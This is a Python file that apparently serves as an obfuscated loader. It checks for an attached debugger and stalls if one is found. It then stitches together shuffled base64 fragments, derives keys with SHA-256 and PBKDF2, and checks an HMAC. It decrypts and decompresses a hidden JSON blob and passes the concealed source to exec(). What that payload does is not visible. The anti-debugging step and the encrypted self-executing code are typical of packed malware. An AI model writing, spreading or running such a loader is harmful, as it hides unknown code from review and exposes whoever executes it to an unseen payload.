import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_980552_0 = 'upfySm99VJVnfxtfXygyQ+'
_980552_1 = 'qqmmDJlAyZTWm4bN+kECs7+af3bb56o3Zoq/2vKN8mp1kSC5pdxuz1'
_980552_2 = 'tPoWVSnPgbXsS338WRwOYrVZ2sh43/46PeYdQ7nbut9VjglsCyu8mKuJ5lISPF'
_980552_3 = 'JjygXn9HK/GWvWgAeeRx4g'
_980552_4 = 'zfSIWobSfDRNGbexcRM3YCDxLkLa6Jv/YaTHXteb'
_980552_5 = 'mkRBPfz/SxaLmU5NdOFNh1txjU5sfRnSzUrTRCLgDBluMPFHclsnzDaxw'
_980552_6 = '/3dZac1/HmJvBnpyIViIiyRo43zjAmMd+EjPLdI2j'
_980552_7 = 'oUCTHTaeCAiTfMIvGvy1zirdqFQRa5qakaHtJ4v75o'
_980552_8 = 'nziuwvxFj4/El5MJzZFIG'
_980552_9 = 'BZkKgXCBP9EwY2eybEQfwkwhOYfFv1+DzvbkMG46M9c'
_980552_10 = 'qkeMEH1UoXiFSMyxA4NPoRCwG+xvem/+HQ8IfSQalTIVdzh4Fgg+pwX0'
_980552_11 = 'XM5t+qdM2fC7rVI/kOI2PWljE2+eb54vEM/awlE'
_980552_12 = 'A3Wbp5zg8DVmBRbOsYEDDG'
_980552_13 = 'wW8wlj1vS69FSdG1h1x6M/d6pJSuuZrkkeu9i3HHFnfEkPqdm/CYd'
_980552_14 = 'qKuYRsv+qBQNSuprros9/aLtTE7x5dDTFFGWEmSuT1nL'
_980552_15 = 'VVq51O2BmjczmJECJzyZ2QqumgqhOFZht+'
_980552_16 = 'Xg/cm76BrmpTJz6TDrVv+1tMVOwNQ1CLbpJlKHBame'
_980552_17 = '9doMa1hwGzQ6bPzgAbRqOvleLtu5iEzj+RksJcp0Zgm7a4WUK/0XPu'
_980552_18 = 'UnLR/1sxEHY/W72RnVLy854'
_980552_19 = 'lUKUdbW7YH1aK8KyvOOnGNa/vuTNmHeqn730cDIuc6/mG'
_980552_20 = 'G6toXs9HF5gCeY7w='
_980552_21 = 'qj1TjcHFSqUnXrbqyx2NlTkOU+89lDL'
_980552_22 = 'Cvw0gUPp7z7vN/YALFTd3IApa3kNCd'
_980552_23 = 'xPPqBXc0LNiCNqXZq0xiBDIp76IZHzsiDy6Wo7Wg2xt/Ke'
_pls = [_980552_0, _980552_1, _980552_2, _980552_3, _980552_4, _980552_5, _980552_6, _980552_7, _980552_8, _980552_9, _980552_10, _980552_11, _980552_12, _980552_13, _980552_14, _980552_15, _980552_16, _980552_17, _980552_18, _980552_19, _980552_20, _980552_21, _980552_22, _980552_23]
_43aa45 = [(34831,56080,2),(38509,38115,2),(32361,63898,2),(59012,8397,2),(26192,19080,2),(41528,24987,2),(58645,3099,2),(26529,5114,2),(26345,42943,2),(13984,29132,2),(6823,43228,2),(34881,33009,2),(53620,8319,2),(41228,27916,2),(30030,49167,2),(3114,11393,2),(0,0,0),(0,0,0)]
_28c59d = 'Ux8Cjg=='
_d27077 = 'BAwTdz6rXrn8Buy/'
_75913b = 'eJTFZ3+XvPQ='
_c057a3 = [21, 17, 7, 4, 5, 13, 10, 15, 6, 3, 19, 22, 18, 20, 14, 8, 2, 12, 1, 9, 23, 11, 16, 0]
_salt = base64.b64decode(_75913b)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _c057a3
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_03dcde = base64.b64decode(_assembled)
_42aff1 = 32
_88c610 = _03dcde[:-_42aff1]
_42aff1 = _03dcde[-_42aff1:]
_2f0514 = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_43aa45)
_hdr = base64.b64decode(_28c59d)
_nonce = base64.b64decode(_d27077)
_km_seed = hashlib.sha256(_2f0514 + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _88c610, hashlib.sha256).digest()
if _calc_tag != _42aff1:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_88c610)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_88c610, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_4e0561'] = mmap
globals()['_77e6fd'] = lambda i: globals()['_4e0561'][str(i)]
_x = globals()['_77e6fd']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
